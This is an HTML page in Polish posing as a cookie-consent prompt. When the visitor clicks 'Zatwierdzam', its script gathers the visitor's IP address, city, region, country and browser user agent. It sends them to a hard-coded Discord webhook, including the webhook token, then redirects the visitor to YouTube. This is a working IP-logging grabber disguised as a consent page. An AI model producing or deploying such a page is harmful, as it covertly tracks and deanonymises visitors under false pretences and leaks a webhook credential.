<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Akceptacja Ciasteczek</title>
  <style>
    body {
      margin: 0;
      background: #0f0f0f;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: #1a1a1a;
      padding: 3rem 2rem;
      border-radius: 1.5rem;
      box-shadow: 0 0 30px #ff69b455;
      text-align: center;
      max-width: 600px;
      color: white;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 1rem;
      color: #ff69b4;
    }

    p {
      font-size: 1.1rem;
      color: #ccc;
      margin-bottom: 2rem;
    }

    button {
      background: linear-gradient(135deg, #ff69b4, #ff85c1);
      color: white;
      border: none;
      padding: 1rem 2.5rem;
      border-radius: 999px;
      font-size: 1.3rem;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 15px #ff69b4aa;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px #ff85c1aa;
    }

    #status {
      margin-top: 2rem;
      font-size: 1rem;
      color: #55ff55;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>🍪 Akceptacja Ciasteczek</h1>
    <p>
      Aby kontynuować, musisz zaakceptować nasz regulamin i politykę plików cookie.<br />
      Klikając przycisk poniżej, zgadzasz się na ich użycie.
    </p>
    <button id="cookie-btn">Zatwierdzam 🍪</button>
    <div id="status"></div>
  </div>

  <script>
    const webhook = "https://discord.com/api/webhooks/1385314908207321098/OYfVnE3smQG42WfSEXP4H4aNo3SCOXq_1zA9Dptvkg2iP41VPVwzwShFTGAx6TkLiMxW";

    document.getElementById("cookie-btn").onclick = async () => {
      const status = document.getElementById("status");
      status.textContent = "Zbieranie danych... 🍪";

      const userAgent = navigator.userAgent;
      let ip = "Nieznane";
      let location = "Nieznana lokalizacja";

      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ip = data.ip || "Brak IP";
        location = `${data.city}, ${data.region}, ${data.country_name}`;
      } catch (e) {
        ip = "Błąd IP";
      }

      const payload = {
        embeds: [{
          title: "🍪 Nowe ciasteczko kliknięte!",
          color: 0xff69b4,
          fields: [
            { name: "IP", value: `\`${ip}\``, inline: false },
            { name: "Lokalizacja", value: location, inline: false },
            { name: "User Agent", value: userAgent.slice(0, 1024), inline: false }
          ],
          footer: { text: "Ciasteczkowy bot" },
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      status.innerHTML = `<b>Dziękujemy za akceptację 🍪</b><br>Przekierowuję...`;

      setTimeout(() => {
        window.location.href = "https://youtube.com";
      }, 3000);
    };
  </script>
</body>
</html>
